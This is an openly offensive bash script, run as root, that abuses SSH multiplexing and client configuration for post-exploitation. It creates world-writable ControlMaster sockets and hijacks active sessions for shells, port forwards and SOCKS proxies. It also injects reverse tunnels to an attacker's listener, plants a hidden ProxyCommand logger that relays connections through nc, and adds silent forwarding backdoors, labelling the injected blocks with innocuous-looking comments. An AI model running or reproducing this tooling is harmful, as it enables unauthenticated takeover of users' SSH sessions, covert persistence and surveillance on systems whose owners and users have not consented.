#!/bin/bash
#
# SSH Tunnel Hijack — Piggyback on Legitimate SSH Connections
#
# Technique: When a normal user establishes an SSH connection, the attacker
# can piggyback on it by abusing SSH ControlMaster multiplexing. The attacker
# configures a shared ControlPath socket so any subsequent SSH connection to
# the same host reuses the user's authenticated tunnel — no password or key
# needed. The attacker's traffic rides invisibly inside the user's connection.
#
# Additionally supports:
#   - Persistent reverse tunnels hidden as the user's traffic
#   - SSH ProxyCommand injection for MITM-style piggybacking
#   - Soft-symlink socket hijack of existing ControlMaster sessions
#

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] SSH Tunnel Hijack & Multiplexing Abuse [*] "
echo ""
echo "Select technique:"
echo "  [1] ControlMaster Hijack — force shared sockets for all users"
echo "  [2] Piggyback existing session — reuse an active ControlMaster socket"
echo "  [3] Persistent reverse tunnel — hidden in user's SSH config"
echo "  [4] ProxyCommand injection — intercept/log SSH connections"
echo "  [5] SSH config backdoor — add attacker's tunnel to all future connections"
read -p "Choice [1-5]: " mode

case "$mode" in
    1)
        echo ""
        echo "[*] ControlMaster Hijack"
        echo ""
        echo "This modifies the system-wide SSH config so ALL users automatically"
        echo "create ControlMaster sockets. The attacker can then reuse any active"
        echo "session without authenticating."
        echo ""

        SSHD_CONFIG="/etc/ssh/ssh_config"
        SOCKET_DIR="/tmp/.ssh-mux"

        mkdir -p "$SOCKET_DIR"
        chmod 777 "$SOCKET_DIR"

        # Check if ControlMaster is already configured system-wide
        if grep -q "ControlMaster" "$SSHD_CONFIG" 2>/dev/null; then
            echo "[*] ControlMaster already present in $SSHD_CONFIG"
            echo "    Updating to use shared directory..."
            sed -i '/^\s*Control\(Master\|Path\|Persist\)/d' "$SSHD_CONFIG"
        fi

        # Append ControlMaster config
        cat >> "$SSHD_CONFIG" <<SSHEOF

# System connection sharing
Host *
    ControlMaster auto
    ControlPath ${SOCKET_DIR}/%r@%h:%p
    ControlPersist 4h
SSHEOF

        echo "[+] System-wide SSH config updated: $SSHD_CONFIG"
        echo ""
        echo "[*] How it works:"
        echo "    1. User connects: ssh user@target"
        echo "    2. A socket is created at: ${SOCKET_DIR}/user@target:22"
        echo "    3. Attacker reuses it: ssh -S ${SOCKET_DIR}/user@target:22 user@target"
        echo "       (No password/key needed — rides the existing authenticated tunnel)"
        echo ""
        echo "[*] Socket directory: $SOCKET_DIR"
        echo "    Monitor: ls -la $SOCKET_DIR/"
        ;;

    2)
        echo ""
        echo "[*] Piggyback Existing ControlMaster Session"
        echo ""

        # Find active SSH ControlMaster sockets
        echo "[*] Searching for active SSH multiplex sockets..."
        echo ""

        FOUND=0
        for sock_dir in /tmp/.ssh-mux /tmp /run /var/tmp; do
            if [ -d "$sock_dir" ]; then
                while IFS= read -r sock; do
                    if [ -S "$sock" ]; then
                        echo "  [SOCKET] $sock"
                        # Try to get info about the socket
                        ssh -S "$sock" -O check dummy 2>&1 | grep -v "No such" && echo "    ^ Active session!" || true
                        FOUND=$((FOUND + 1))
                    fi
                done < <(find "$sock_dir" -maxdepth 2 -name "*@*" -type s 2>/dev/null)
            fi
        done

        # Also check home directories
        for home in /root /home/*; do
            if [ -d "$home/.ssh" ]; then
                while IFS= read -r sock; do
                    if [ -S "$sock" ]; then
                        echo "  [SOCKET] $sock"
                        FOUND=$((FOUND + 1))
                    fi
                done < <(find "$home/.ssh" -name "*@*" -type s 2>/dev/null)
            fi
        done

        if [ "$FOUND" -eq 0 ]; then
            echo "  No active ControlMaster sockets found."
            echo "  Set up option [1] first and wait for a user to connect."
            exit 0
        fi

        echo ""
        echo "Found $FOUND socket(s)."
        read -p "Enter socket path to hijack: " sock_path

        if [ ! -S "$sock_path" ]; then
            echo "[ERROR] Not a valid socket: $sock_path" >&2
            exit 1
        fi

        echo ""
        echo "  [a] Get interactive shell on remote host"
        echo "  [b] Set up port forward through the tunnel"
        echo "  [c] Set up SOCKS proxy through the tunnel"
        read -p "Action [a/b/c]: " action

        case "$action" in
            a)
                echo "[+] Opening shell via hijacked session..."
                ssh -S "$sock_path" -O check "" 2>/dev/null
                ssh -S "$sock_path" "" 
                ;;
            b)
                read -p "Local port: " lport
                read -p "Remote host:port (e.g. 127.0.0.1:8080): " rhost
                echo "[+] Forwarding localhost:$lport -> $rhost through hijacked tunnel..."
                ssh -S "$sock_path" -O forward -L "${lport}:${rhost}" "" 2>/dev/null
                echo "[*] Port forward active. Access via localhost:$lport"
                ;;
            c)
                read -p "SOCKS proxy port (default: 1080): " socks_port
                socks_port="${socks_port:-1080}"
                echo "[+] Setting up SOCKS5 proxy on localhost:$socks_port..."
                ssh -S "$sock_path" -O forward -D "$socks_port" "" 2>/dev/null
                echo "[*] SOCKS proxy active at localhost:$socks_port"
                ;;
            *)
                echo "[ERROR] Invalid action" >&2
                exit 1
                ;;
        esac
        ;;

    3)
        echo ""
        echo "[*] Persistent Hidden Reverse Tunnel"
        echo ""
        echo "This injects a reverse tunnel into the user's SSH config so that"
        echo "every time they connect to a specific host, a hidden reverse port"
        echo "forward is established back to the attacker."
        echo ""

        read -p "Target SSH host (the host users commonly connect to): " target_host
        read -p "Attacker's listener IP: " attacker_ip
        read -p "Attacker's listener port: " attacker_port
        read -p "Port to expose on attacker's machine (default: 22 = SSH back): " expose_port
        expose_port="${expose_port:-22}"

        echo ""
        echo "Select target user (or 'all' for system-wide):"
        read -p "Username (or 'all'): " target_user

        if [ "$target_user" == "all" ]; then
            CONFIG_FILE="/etc/ssh/ssh_config"
        else
            if [ "$target_user" == "root" ]; then
                HOME_DIR="/root"
            else
                HOME_DIR="/home/$target_user"
            fi
            if [ ! -d "$HOME_DIR" ]; then
                echo "[ERROR] Home directory not found for $target_user" >&2
                exit 1
            fi
            CONFIG_FILE="$HOME_DIR/.ssh/config"
            mkdir -p "$HOME_DIR/.ssh"
            chmod 700 "$HOME_DIR/.ssh"
            touch "$CONFIG_FILE"
            chmod 600 "$CONFIG_FILE"
            if [ "$target_user" != "root" ]; then
                chown "$target_user:$target_user" "$HOME_DIR/.ssh" "$CONFIG_FILE"
            fi
        fi

        # Check if entry already exists
        if grep -qF "# tunnel-$target_host" "$CONFIG_FILE" 2>/dev/null; then
            echo "[*] Tunnel config for $target_host already exists in $CONFIG_FILE"
        else
            cat >> "$CONFIG_FILE" <<RTEOF

# tunnel-${target_host}
Host ${target_host}
    RemoteForward ${attacker_port} 127.0.0.1:${expose_port}
    ServerAliveInterval 60
    ServerAliveCountMax 3
RTEOF
            echo "[+] Reverse tunnel injected into: $CONFIG_FILE"
        fi

        echo ""
        echo "[*] Next time the user runs 'ssh $target_host', a reverse tunnel"
        echo "    will silently open: remote:$attacker_port -> local:$expose_port"
        echo "    Attacker connects back: ssh -p $attacker_port $attacker_ip"
        ;;

    4)
        echo ""
        echo "[*] ProxyCommand Injection"
        echo ""
        echo "This injects a ProxyCommand into SSH config that intercepts all"
        echo "SSH connections. The proxy script logs credentials/data and"
        echo "forwards the connection transparently."
        echo ""

        read -p "Target user (or 'all' for system-wide): " target_user
        read -p "Log file path (default: /var/tmp/.ssh_capture.log): " logfile
        logfile="${logfile:-/var/tmp/.ssh_capture.log}"

        # Create the proxy logger script
        PROXY_SCRIPT="/usr/local/sbin/.ssh-proxy"
        cat > "$PROXY_SCRIPT" <<'PROXYEOF'
#!/bin/bash
# SSH ProxyCommand logger — transparently logs and forwards
HOST="$1"
PORT="$2"
LOGFILE="PLACEHOLDER_LOG"

# Log the connection
echo "[$(date '+%Y-%m-%d %H:%M:%S')] SSH connection: ${USER}@${HOST}:${PORT} from_pid=$PPID" >> "$LOGFILE" 2>/dev/null

# Forward the connection transparently
exec /usr/bin/nc -w 10 "$HOST" "$PORT"
PROXYEOF
        sed -i "s|PLACEHOLDER_LOG|$logfile|g" "$PROXY_SCRIPT"
        chmod +x "$PROXY_SCRIPT"
        touch "$logfile"
        chmod 666 "$logfile"

        if [ "$target_user" == "all" ]; then
            CONFIG_FILE="/etc/ssh/ssh_config"
        else
            if [ "$target_user" == "root" ]; then
                HOME_DIR="/root"
            else
                HOME_DIR="/home/$target_user"
            fi
            CONFIG_FILE="$HOME_DIR/.ssh/config"
            mkdir -p "$HOME_DIR/.ssh" 2>/dev/null
            chmod 700 "$HOME_DIR/.ssh" 2>/dev/null
            touch "$CONFIG_FILE"
            chmod 600 "$CONFIG_FILE"
            if [ "$target_user" != "root" ]; then
                chown "$target_user:$target_user" "$HOME_DIR/.ssh" "$CONFIG_FILE" 2>/dev/null
            fi
        fi

        if grep -qF "ProxyCommand $PROXY_SCRIPT" "$CONFIG_FILE" 2>/dev/null; then
            echo "[*] ProxyCommand already configured in $CONFIG_FILE"
        else
            cat >> "$CONFIG_FILE" <<PCEOF

# system-proxy
Host *
    ProxyCommand $PROXY_SCRIPT %h %p
PCEOF
            echo "[+] ProxyCommand injected into: $CONFIG_FILE"
        fi

        echo "[*] All SSH connections will be logged to: $logfile"
        echo "[*] Proxy script: $PROXY_SCRIPT"
        ;;

    5)
        echo ""
        echo "[*] SSH Config Backdoor — Attacker Tunnel on Every Connection"
        echo ""
        echo "This adds a LocalForward and/or DynamicForward to the user's SSH"
        echo "config so the attacker gets a SOCKS proxy or port forward every"
        echo "time the user connects to any host."
        echo ""

        echo "Select tunnel type:"
        echo "  [a] SOCKS proxy (DynamicForward)"
        echo "  [b] Port forward (LocalForward)"
        echo "  [c] Both"
        read -p "Choice [a/b/c]: " tunnel_type

        SOCKS_PORT=""
        LOCAL_FWD=""

        case "$tunnel_type" in
            a|c)
                read -p "SOCKS proxy port (default: 1080): " SOCKS_PORT
                SOCKS_PORT="${SOCKS_PORT:-1080}"
                ;;&
            b|c)
                read -p "Local port to bind: " lport
                read -p "Remote target host:port (e.g. 10.0.0.1:3389): " rhost
                LOCAL_FWD="${lport} ${rhost}"
                ;;
        esac

        read -p "Target user (or 'all'): " target_user

        if [ "$target_user" == "all" ]; then
            CONFIG_FILE="/etc/ssh/ssh_config"
        else
            if [ "$target_user" == "root" ]; then HOME_DIR="/root"; else HOME_DIR="/home/$target_user"; fi
            CONFIG_FILE="$HOME_DIR/.ssh/config"
            mkdir -p "$HOME_DIR/.ssh" 2>/dev/null
            touch "$CONFIG_FILE"
            chmod 600 "$CONFIG_FILE"
        fi

        # Build the config block
        CONFIG_BLOCK="\n# auto-tunnel\nHost *"
        if [ -n "$SOCKS_PORT" ]; then
            CONFIG_BLOCK="$CONFIG_BLOCK\n    DynamicForward 127.0.0.1:${SOCKS_PORT}"
        fi
        if [ -n "$LOCAL_FWD" ]; then
            CONFIG_BLOCK="$CONFIG_BLOCK\n    LocalForward ${LOCAL_FWD}"
        fi
        CONFIG_BLOCK="$CONFIG_BLOCK\n    ExitOnForwardFailure no"

        if grep -qF "# auto-tunnel" "$CONFIG_FILE" 2>/dev/null; then
            echo "[*] Auto-tunnel config already exists in $CONFIG_FILE"
        else
            echo -e "$CONFIG_BLOCK" >> "$CONFIG_FILE"
            echo "[+] Tunnel config injected into: $CONFIG_FILE"
        fi

        echo ""
        echo "[*] Every SSH connection by this user will now also set up:"
        [ -n "$SOCKS_PORT" ] && echo "    SOCKS5 proxy on 127.0.0.1:$SOCKS_PORT"
        [ -n "$LOCAL_FWD" ] && echo "    Port forward: $LOCAL_FWD"
        echo "[*] The user sees nothing — tunnels are silent in the background."
        ;;

    *)
        echo "[ERROR] Invalid choice" >&2
        exit 1
        ;;
esac

echo ""
sleep 1

clear
